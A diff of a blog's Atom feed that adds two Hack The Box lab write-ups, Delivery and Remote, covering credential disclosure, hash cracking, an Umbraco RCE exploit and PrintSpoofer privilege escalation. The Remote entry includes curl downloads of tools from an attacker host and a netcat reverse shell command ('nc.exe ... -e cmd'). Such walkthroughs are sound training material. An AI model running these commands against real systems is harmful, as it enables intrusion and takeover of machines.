@@ -1,4 +1,677 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-23T13:32:58+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Active</title><link href="http://localhost:4000/posts/active/" rel="alternate" type="text/html" title="Hack The Box: Active" /><published>2026-10-22T00:00:00+05:30</published><updated>2026-10-22T00:00:00+05:30</updated><id>http://localhost:4000/posts/active</id><content type="html" xml:base="http://localhost:4000/posts/active/"><![CDATA[<h1 id="htb-active">HTB Active</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-23T17:23:10+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Delivery</title><link href="http://localhost:4000/posts/delivery/" rel="alternate" type="text/html" title="Hack The Box: Delivery" /><published>2026-10-23T00:00:00+05:30</published><updated>2026-10-23T00:00:00+05:30</updated><id>http://localhost:4000/posts/delivery</id><content type="html" xml:base="http://localhost:4000/posts/delivery/"><![CDATA[<h1 id="htb-delivery">HTB Delivery</h1>
+
+<p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.8.154</code><br />
+<strong>Operating System:</strong> Linux (Debian)<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Attack Path:</strong> osTicket Email Disclosure → Mattermost Account Access → SSH → Password Hash Cracking → Root</p>
+
+<h2 id="1-enumeration">1. Enumeration</h2>
+
+<p>I started with an Nmap scan to identify the target’s exposed services and determine which applications might provide an initial foothold.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p- --min-rate 1000 10.129.8.154 -oN nmap.txt
+</code></pre></div></div>
+
+<p>The relevant results were:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>Service</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 7.9p1</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>nginx 1.14.2</td>
+    </tr>
+    <tr>
+      <td>8065</td>
+      <td>HTTP</td>
+      <td>Mattermost 5.30.0</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The web services exposed two interesting applications:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">http://helpdesk.delivery.htb</code> — osTicket</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">http://delivery.htb:8065</code> — Mattermost</p>
+  </li>
+</ul>
+
+<p>I added the hostnames to my local <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "10.129.8.154 delivery.htb helpdesk.delivery.htb" | sudo tee -a /etc/hosts
+</code></pre></div></div>
+
+<h3 id="11-osticket">1.1 osTicket</h3>
+
+<p>The helpdesk application allowed visitors to create support tickets without an existing account. After submitting a ticket, osTicket provided a ticket ID and an associated email address in the format:</p>
+
+<p><img src="/assets/images/delivery_osticket_1.png" alt="OSTicket 1" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ticket_id&gt;@delivery.htb
+</code></pre></div></div>
+
+<p>I also received the information needed to check the ticket’s status and view its conversation thread.</p>
+
+<h3 id="12-mattermost">1.2 Mattermost</h3>
+
+<p>Mattermost was accessible on port 8065. I attempted to register a new account, but the application required email verification. Since Mattermost accepted addresses ending in <code class="language-plaintext highlighter-rouge">delivery.htb</code>, I needed a way to receive a verification link sent to that domain.</p>
+
+<p>Rather than abandoning the registration process, I investigated whether the helpdesk application could be used to retrieve the verification email.</p>
+
+<h2 id="2-exploiting-the-email-workflow">2. Exploiting the Email Workflow</h2>
+
+<p>OsTicket assigned a delivery.htb email address to newly created tickets, and its ticket thread displayed messages associated with the ticket.</p>
+
+<p>I used this workflow to obtain a Mattermost account.</p>
+
+<ol>
+  <li>
+    <p>Created a new support ticket through osTicket.</p>
+  </li>
+  <li>
+    <p>Recorded the ticket ID and the email address assigned to it.</p>
+  </li>
+  <li>
+    <p>Opened the ticket thread using the ticket ID and the email address originally supplied when creating the ticket.</p>
+  </li>
+  <li>
+    <p>Started a Mattermost registration using the ticket-associated email address.</p>
+  </li>
+  <li>
+    <p>Mattermost sent an account-verification link to that address.</p>
+  </li>
+</ol>
+
+<p><img src="/assets/images/delivery_osticket_2.png" alt="OSTicket 1" /></p>
+
+<ol>
+  <li>
+    <p>Returned to the osTicket ticket thread and retrieved the verification link.</p>
+  </li>
+  <li>
+    <p>Opened the link to verify the Mattermost account and logged in.</p>
+  </li>
+</ol>
+
+<p>This worked because the helpdesk workflow exposed the verification message through the ticket thread. The email address did not need to belong to a conventional mailbox that I could access separately; the application itself provided a way to view the message.</p>
+
+<p>After verification, I was able to access Mattermost and join the internal team.</p>
+
+<h2 id="3-enumerating-mattermost">3. Enumerating Mattermost</h2>
+
+<p>After gaining access to Mattermost, I explored the internal channels for information that could help with further access.</p>
+
+<p>One of the messages posted by <code class="language-plaintext highlighter-rouge">root</code> in the developers’ channel contained two important clues:</p>
+
+<p><img src="/assets/images/delivery_mattermost_1.png" alt="MatterMost 1" /></p>
+
+<p>The message disclosed SSH credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: maildeliverer
+Password: &lt;REDACTED&gt;
+</code></pre></div></div>
+
+<p>It also hinted that users might choose passwords derived from <code class="language-plaintext highlighter-rouge">PleaseSubscribe!</code>.</p>
+
+<p>The first clue provided a direct route to the target system. The second suggested a potential password-cracking strategy for later in the attack.</p>
+
+<h2 id="4-initial-foothold-via-ssh">4. Initial Foothold via SSH</h2>
+
+<p>Using the credentials obtained from Mattermost, I connected to the target over SSH.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh maildeliverer@10.129.8.154
+</code></pre></div></div>
+
+<p>After successfully authenticating, I began enumerating the host for application files, configuration files, and other credentials.</p>
+
+<p>During enumeration, I discovered the Mattermost installation under <code class="language-plaintext highlighter-rouge">/opt/mattermost</code>.</p>
+
+<h2 id="5-extracting-mattermost-database-credentials">5. Extracting Mattermost Database Credentials</h2>
+
+<p>Mattermost’s configuration file contained the database connection settings:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /opt/mattermost/config/config.json
+</code></pre></div></div>
+
+<p>The relevant configuration was:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"SqlSettings": {
+    "DriverName": "mysql",
+    "DataSource": "mmuser:&lt;REDACTED&gt;@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8&amp;readTimeout=30s&amp;writeTimeout=30s"
+}
+</code></pre></div></div>
+
+<p>This revealed the database credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: mmuser
+Password: &lt;REDACTED&gt;
+Database: mattermost
+</code></pre></div></div>
+
+<p>Since the database was listening on localhost, I could access it from my existing SSH session.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -u mmuser -p
+</code></pre></div></div>
+
+<p>After entering the password, I listed the available databases and connected to Mattermost.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SHOW DATABASES;
+USE mattermost;
+SHOW TABLES;
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">Users</code> table was particularly interesting because it contained account information and password hashes.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT Username, Password, Email, Roles
+FROM Users;
+</code></pre></div></div>
+
+<p>The results included a <code class="language-plaintext highlighter-rouge">root</code> account with the role <code class="language-plaintext highlighter-rouge">system_admin system_user</code> and a bcrypt password hash.</p>
+
+<p>At this point, I had obtained the hash but not the plaintext password.</p>
+
+<h2 id="6-cracking-the-mattermost-root-password">6. Cracking the Mattermost Root Password</h2>
+
+<p>The developers’ channel had explicitly mentioned password reuse and variations of:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PleaseSubscribe!
+</code></pre></div></div>
+
+<p>Instead of starting with a large, generic password dictionary, I used this information to build a targeted wordlist.</p>
+
+<h3 id="61-generating-password-candidates">6.1 Generating password candidates</h3>
+
+<p>First, I created a file containing the base password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'PleaseSubscribe!' &gt; password.list
+</code></pre></div></div>
+
+<p>I then applied Hashcat’s <code class="language-plaintext highlighter-rouge">best66.rule</code> to generate variations of the phrase.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -r /usr/share/hashcat/rules/best66.rule \
+  password.list --stdout &gt; guess_password.list
+</code></pre></div></div>
+
+<p>Rule-based mutations can produce candidates involving capitalization changes, appended numbers, and other common modifications. This approach is useful when an application explicitly hints at a password pattern.</p>
+
+<h3 id="62-extracting-and-cracking-the-hash">6.2 Extracting and cracking the hash</h3>
+
+<p>From the database results, I extracted the hash belonging to the Mattermost <code class="language-plaintext highlighter-rouge">root</code> account and saved it in <code class="language-plaintext highlighter-rouge">hash.txt</code>.</p>
+
+<p>The hash used the bcrypt format, identified by the <code class="language-plaintext highlighter-rouge">$2a$</code> prefix and cost factor <code class="language-plaintext highlighter-rouge">10</code>. Hashcat supports this format with mode <code class="language-plaintext highlighter-rouge">3200</code>.</p>
+
+<p>I ran:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 3200 hash.txt \
+  --wordlist ./guess_password.list
+</code></pre></div></div>
+
+<p>Hashcat successfully recovered the password</p>
+
+<p>This confirmed that the channel message was not merely general security advice; it was a practical hint toward the password used by the Mattermost administrator.</p>
+
+<h2 id="7-privilege-escalation-to-root">7. Privilege Escalation to Root</h2>
+
+<p>With the recovered password, I attempted to switch from <code class="language-plaintext highlighter-rouge">maildeliverer</code> to the local Linux <code class="language-plaintext highlighter-rouge">root</code> account.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su root
+</code></pre></div></div>
+
+<p>The authentication succeeded, confirming that the password had been reused for the system’s root account.</p>
+
+<p>I then retrieved the root flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /root
+cat root.txt
+</code></pre></div></div>
+
+<p><strong>Root obtained.</strong></p>
+
+<h2 id="8-attack-chain-summary">8. Attack Chain Summary</h2>
+
+<p>The complete attack chain was:</p>
+
+<ol>
+  <li>
+    <p><strong>Enumeration:</strong> Identified SSH, nginx, and Mattermost.</p>
+  </li>
+  <li>
+    <p><strong>Email verification bypass through application chaining:</strong> Used osTicket’s ticket-thread functionality to retrieve a Mattermost verification link.</p>
+  </li>
+  <li>
+    <p><strong>Application access:</strong> Registered and verified a Mattermost account.</p>
+  </li>
+  <li>
+    <p><strong>Credential disclosure:</strong> Found SSH credentials and a password-pattern hint in an internal channel.</p>
+  </li>
+  <li>
+    <p><strong>Initial foothold:</strong> Logged in as <code class="language-plaintext highlighter-rouge">maildeliverer</code> over SSH.</p>
+  </li>
+  <li>
+    <p><strong>Configuration enumeration:</strong> Extracted the Mattermost database credentials from <code class="language-plaintext highlighter-rouge">config.json</code>.</p>
+  </li>
+  <li>
+    <p><strong>Database access:</strong> Retrieved the <code class="language-plaintext highlighter-rouge">root</code> user’s bcrypt password hash.</p>
+  </li>
+  <li>
+    <p><strong>Targeted cracking:</strong> Used a custom wordlist and Hashcat rules to recover <code class="language-plaintext highlighter-rouge">PleaseSubscribe!21</code>.</p>
+  </li>
+  <li>
+    <p><strong>Privilege escalation:</strong> Reused the recovered password with <code class="language-plaintext highlighter-rouge">su root</code>.</p>
+  </li>
+  <li>
+    <p><strong>Objective:</strong> Read <code class="language-plaintext highlighter-rouge">/root/root.txt</code>.</p>
+  </li>
+</ol>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="web" /><category term="linux" /><category term="OS-Ticket" /><category term="Mattermost" /><category term="Password-Reuse" /><summary type="html"><![CDATA[HTB Delivery]]></summary></entry><entry><title type="html">Hack The Box: Remote</title><link href="http://localhost:4000/posts/remote/" rel="alternate" type="text/html" title="Hack The Box: Remote" /><published>2026-10-23T00:00:00+05:30</published><updated>2026-10-23T00:00:00+05:30</updated><id>http://localhost:4000/posts/remote</id><content type="html" xml:base="http://localhost:4000/posts/remote/"><![CDATA[<h1 id="htb-remote">HTB Remote</h1>
+
+<p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.230.172</code><br />
+<strong>Operating System:</strong> Windows<br />
+<strong>Attack Chain:</strong> Anonymous FTP/NFS Enumeration → Umbraco Credential Recovery → Authenticated RCE → SeImpersonatePrivilege → SYSTEM</p>
+
+<h2 id="1-enumeration">1. Enumeration</h2>
+
+<p>I began by scanning the target with Nmap to identify open ports, running services, and potential entry points.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p21,80,111,135,139,445,2049,5985 \
+  --min-rate 1000 -oN nmap.txt 10.129.230.172
+</code></pre></div></div>
+
+<p>The scan revealed the following services:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>Service</th>
+      <th>Observation</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>21</td>
+      <td>FTP</td>
+      <td>Microsoft FTP Service; anonymous login allowed</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>IIS-hosted website, titled Acme Widgets</td>
+    </tr>
+    <tr>
+      <td>111</td>
+      <td>RPC</td>
+      <td>RPC-related service</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td>MSRPC</td>
+      <td>Windows RPC</td>
+    </tr>
+    <tr>
+      <td>139</td>
+      <td>NetBIOS</td>
+      <td>SMB-related service</td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td>SMB</td>
+      <td>Microsoft SMB</td>
+    </tr>
+    <tr>
+      <td>2049</td>
+      <td>NFS</td>
+      <td>NFS export available</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td>WinRM</td>
+      <td>Potential remote Windows management</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Two services immediately stood out: anonymous FTP access and NFS on port 2049. I investigated both before attempting exploitation.</p>
+
+<h2 id="2-anonymous-ftp-and-nfs-enumeration">2. Anonymous FTP and NFS Enumeration</h2>
+
+<h3 id="21-anonymous-ftp">2.1 Anonymous FTP</h3>
+
+<p>I connected to the FTP service using the <code class="language-plaintext highlighter-rouge">anonymous</code> username.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.129.230.172
+</code></pre></div></div>
+
+<p>After entering <code class="language-plaintext highlighter-rouge">anonymous</code> as the username, authentication succeeded:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>220 Microsoft FTP Service
+331 Anonymous access allowed
+230 User logged in.
+</code></pre></div></div>
+
+<p>However, listing the directory returned no files. Anonymous access was available, but it did not immediately provide useful content.</p>
+
+<p>I moved on to NFS enumeration.</p>
+
+<h3 id="22-discovering-the-nfs-export">2.2 Discovering the NFS export</h3>
+
+<p>I used <code class="language-plaintext highlighter-rouge">showmount</code> to enumerate the server’s exported NFS directories.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>showmount -e 10.129.230.172
+</code></pre></div></div>
+
+<p>The output revealed:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Export list for 10.129.230.172:
+/site_backups (everyone)
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">/site_backups</code> export was accessible to everyone, making it a promising source of application files and potentially sensitive configuration data.</p>
+
+<p>I mounted the export locally:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo mkdir -p /mnt/nfs
+
+sudo mount -t nfs \
+  10.129.230.172:/site_backups /mnt/nfs
+</code></pre></div></div>
+
+<p>I then inspected the mounted directory.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /mnt/nfs
+ls -la
+</code></pre></div></div>
+
+<p>The contents resembled an ASP.NET web application:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>App_Browsers
+App_Data
+App_Plugins
+App_Code
+bin
+Config
+css
+default.aspx
+Global.asax
+Media
+scripts
+Umbraco
+Umbraco_Client
+Views
+Web.config
+</code></pre></div></div>
+
+<p>The presence of directories such as <code class="language-plaintext highlighter-rouge">Umbraco</code>, <code class="language-plaintext highlighter-rouge">Umbraco_Client</code>, and <code class="language-plaintext highlighter-rouge">App_Data</code> suggested that the website was running Umbraco CMS.</p>
+
+<p>The next step was to inspect the application’s data files for stored credentials.</p>
+
+<h2 id="3-extracting-umbraco-credentials">3. Extracting Umbraco Credentials</h2>
+
+<p>Inside <code class="language-plaintext highlighter-rouge">App_Data</code>, I discovered an Umbraco database file named <code class="language-plaintext highlighter-rouge">Umbraco.sdf</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /mnt/nfs/App_Data
+ls -la
+</code></pre></div></div>
+
+<p>The directory contained:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cache
+Logs
+Models
+packages
+TEMP
+umbraco.config
+Umbraco.sdf
+</code></pre></div></div>
+
+<p>Since the database was a file-based SQL Server Compact database, I searched its readable strings for account information.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings Umbraco.sdf | grep -i -E 'admin|password|hash'
+</code></pre></div></div>
+
+<p>The output included entries resembling:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin
+admin@htb.local
+b8be16a....&lt;REDACTED&gt;....2f22a04991b90e2aaa
+{"hashAlgorithm":"SHA1"}
+</code></pre></div></div>
+
+<p>This provided an email address and a password hash associated with the Umbraco administrator.</p>
+
+<p>The hash was a 40-character hexadecimal value, consistent with a SHA-1 digest. I saved the hash to <code class="language-plaintext highlighter-rouge">hash.txt</code> and attempted to recover its plaintext using Hashcat.</p>
+
+<h2 id="4-cracking-the-administrator-password">4. Cracking the Administrator Password</h2>
+
+<p>I used Hashcat mode <code class="language-plaintext highlighter-rouge">100</code>, which corresponds to raw SHA-1 hashes, with the RockYou wordlist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 100 hash.txt \
+  /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p>Hashcat successfully recovered the password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b8be16afba8c314ad33d812f22a04991b90e2aaa:&lt;REDACTED&gt;
+</code></pre></div></div>
+
+<p>The recovered credentials were:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: admin@htb.local
+Password: &lt;REDACTED&gt;
+</code></pre></div></div>
+
+<p>This gave me valid credentials for the Umbraco administration interface.</p>
+
+<p><strong>Why this worked:</strong> The database backup was readable without authentication, and the administrator’s SHA-1 password hash could be cracked offline. The exposed backup therefore provided a path to authenticated application access.</p>
+
+<h2 id="5-authenticated-remote-code-execution-in-umbraco">5. Authenticated Remote Code Execution in Umbraco</h2>
+
+<p>I navigated to the Umbraco administration interface:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.129.230.172/umbraco/
+</code></pre></div></div>
+
+<p>Using the recovered credentials, I logged in successfully.</p>
+
+<p>After authenticating, I identified the Umbraco version as <strong>7.12.4</strong>.</p>
+
+<p>This version was susceptible to an authenticated remote-code-execution technique involving the XSLT visualization functionality. Since I already had administrator credentials, I could use the application’s privileged functionality rather than attempting an unauthenticated exploit.</p>
+
+<p>I used the proof of concept from:</p>
+
+<p><a href="https://github.com/Jonoans/Umbraco-RCE/">https://github.com/Jonoans/Umbraco-RCE/</a></p>
+
+<h3 id="51-exploiting-umbraco">5.1 Exploiting Umbraco</h3>
+
+<p>Before running the exploit, I started a listener-ready environment on my Kali machine. The proof of concept used ports <code class="language-plaintext highlighter-rouge">4444</code> and <code class="language-plaintext highlighter-rouge">4445</code> for its connection workflow, so those ports needed to be available.</p>
+
+<p>I then executed:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py \
+  -u admin@htb.local \
+  -p '&lt;REDACTED&gt;' \
+  -w 'http://10.129.230.172/' \
+  -i 10.10.15.25
+</code></pre></div></div>
+
+<p>The exploit authenticated to the Umbraco back-office endpoint and targeted the XSLT visualization functionality.</p>
+
+<p>The relevant output was:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Trying to bind to :: on port 4444: Done
+[+] Waiting for connections on :::4444
+[+] Trying to bind to :: on port 4445: Done
+[+] Waiting for connections on :::4445
+[*] Logging in at .../umbraco/backoffice/UmbracoApi/Authentication/PostLogin
+[*] Exploiting at .../umbraco/developer/Xslt/xsltVisualize.aspx
+[*] Switching to interactive mode
+</code></pre></div></div>
+
+<p>The exploit succeeded, giving me an interactive PowerShell session on the target.</p>
+
+<p>I checked the security context:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami
+</code></pre></div></div>
+
+<p>The result was:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iis apppool\defaultapppool
+</code></pre></div></div>
+
+<p>I had achieved remote code execution, but the shell was running as the IIS application pool identity rather than an administrator.</p>
+
+<p>I then retrieved the user flag from the Public Desktop directory:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type C:\Users\Public\Desktop\user.txt
+</code></pre></div></div>
+
+<p><strong>Initial foothold achieved.</strong></p>
+
+<h2 id="6-windows-privilege-enumeration">6. Windows Privilege Enumeration</h2>
+
+<p>With command execution established, I enumerated the privileges assigned to the IIS application pool identity.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /priv
+</code></pre></div></div>
+
+<p>The important entry was:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Privilege Name                Description                      State
+----------------------------- -------------------------------- --------
+SeImpersonatePrivilege        Impersonate a client after
+                              authentication                   Enabled
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> allows a process to impersonate a security token under appropriate conditions. On vulnerable Windows configurations, this privilege can be abused through token-impersonation techniques to escalate privileges.</p>
+
+<p>This made PrintSpoofer a potential route to SYSTEM.</p>
+
+<p>However, possessing <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> does not automatically guarantee escalation. The technique depends on the Windows environment, available token sources, service configuration, and other conditions.</p>
+
+<h3 id="61-checking-the-print-spooler-service">6.1 Checking the Print Spooler service</h3>
+
+<p>I checked whether the Print Spooler service was running:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Service -Name Spooler
+</code></pre></div></div>
+
+<p>The result was:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Status   Name      DisplayName
+------   ----      -----------
+Running  Spooler   Print Spooler
+</code></pre></div></div>
+
+<p>The combination of an enabled impersonation privilege and a running Print Spooler made PrintSpoofer worth testing.</p>
+
+<h2 id="7-privilege-escalation-with-printspoofer">7. Privilege Escalation with PrintSpoofer</h2>
+
+<p>I transferred PrintSpoofer and Netcat to the target from my Kali machine.</p>
+
+<p>On Kali, I hosted the files using a simple HTTP server:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 8000
+</code></pre></div></div>
+
+<p>On the target, I downloaded both executables:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl.exe http://10.10.15.25:8000/PrintSpoofer64.exe -o print.exe
+
+curl.exe http://10.10.15.25:8000/nc.exe -o nc.exe
+</code></pre></div></div>
+
+<p>I used the 64-bit PrintSpoofer binary because the target was running 64-bit Windows.</p>
+
+<h3 id="71-preparing-the-reverse-shell">7.1 Preparing the reverse shell</h3>
+
+<p>On Kali, I started a listener on port <code class="language-plaintext highlighter-rouge">5555</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 5555
+</code></pre></div></div>
+
+<p>Then, from the IIS application pool shell, I executed PrintSpoofer and instructed it to launch Netcat:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Public\Documents&gt; .\print.exe -c "c:\Users\Public\Documents\nc.exe 10.10.15.25 5555 -e cmd"
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">CreateProcessAsUser() OK</code> message indicated that the process-creation stage succeeded.</p>
+
+<p>afterward, the reverse connection arrived at my  listener.</p>
+
+<h3 id="72-verifying-system-access">7.2 Verifying SYSTEM access</h3>
+
+<p>I now had the highest local Windows security context</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ nc -lnvp 5555                      
+listening on [any] 5555 ...
+connect to [10.10.15.25] from (UNKNOWN) [10.129.230.172] 49731
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+</code></pre></div></div>
+
+<p><strong>Root obtained.</strong></p>
+
+<h2 id="8-attack-chain-summary">8. Attack Chain Summary</h2>
+
+<p>The complete path from unauthenticated access to SYSTEM was:</p>
+
+<ol>
+  <li>
+    <p><strong>Enumeration:</strong> Identified anonymous FTP, HTTP, SMB, NFS, and WinRM.</p>
+  </li>
+  <li>
+    <p><strong>NFS discovery:</strong> Found the publicly accessible <code class="language-plaintext highlighter-rouge">/site_backups</code> export.</p>
+  </li>
+  <li>
+    <p><strong>Sensitive file disclosure:</strong> Retrieved the Umbraco application files and database.</p>
+  </li>
+  <li>
+    <p><strong>Password cracking:</strong> Recovered <code class="language-plaintext highlighter-rouge">baconandcheese</code> from the administrator’s SHA-1 hash.</p>
+  </li>
+  <li>
+    <p><strong>Authenticated RCE:</strong> Exploited Umbraco 7.12.4 through its XSLT visualization functionality.</p>
+  </li>
+  <li>
+    <p><strong>Initial foothold:</strong> Obtained command execution as <code class="language-plaintext highlighter-rouge">iis apppool\defaultapppool</code>.</p>
+  </li>
+  <li>
+    <p><strong>Privilege enumeration:</strong> Discovered enabled <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>.</p>
+  </li>
+  <li>
+    <p><strong>Service enumeration:</strong> Confirmed that the Print Spooler was running.</p>
+  </li>
+  <li>
+    <p><strong>Privilege escalation:</strong> Used PrintSpoofer to launch a process as <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</p>
+  </li>
+  <li>
+    <p><strong>Objective:</strong> Retrieved the user and root flags.</p>
+  </li>
+</ol>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="windows" /><category term="web" /><category term="NFS" /><category term="Umbraco" /><category term="SeImpersonatePrivilege" /><summary type="html"><![CDATA[HTB Remote]]></summary></entry><entry><title type="html">Hack The Box: Active</title><link href="http://localhost:4000/posts/active/" rel="alternate" type="text/html" title="Hack The Box: Active" /><published>2026-10-22T00:00:00+05:30</published><updated>2026-10-22T00:00:00+05:30</updated><id>http://localhost:4000/posts/active</id><content type="html" xml:base="http://localhost:4000/posts/active/"><![CDATA[<h1 id="htb-active">HTB Active</h1>
 
 <p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.8.52</code><br />
 <strong>Domain:</strong> <code class="language-plaintext highlighter-rouge">active.htb</code><br />
@@ -742,287 +1415,7 @@ ls
       <td>Authenticate as Administrator</td>
     </tr>
   </tbody>
